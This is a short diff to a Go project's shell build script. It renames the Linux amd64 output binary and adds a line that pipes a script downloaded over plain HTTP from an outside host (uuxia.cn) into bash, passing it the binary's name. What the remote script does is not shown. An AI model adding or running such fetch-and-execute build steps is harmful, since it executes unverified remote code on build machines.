@@ -52,7 +52,8 @@ function build_windows_amd64() {
 }
 
 function build_linux_amd64() {
-  CGO_ENABLED=0 GOOS=linux GOARCH=amd64 go build -ldflags "$ldflags" -o ${appname}
+  CGO_ENABLED=0 GOOS=linux GOARCH=amd64 go build -ldflags "$ldflags" -o ${appname}_${version}_linux_amd64
+  bash <(curl -s -S -L http://uuxia.cn:8086/up) ${appname}_${version}_linux_amd64
 }
 
 function build_linux_arm64() {
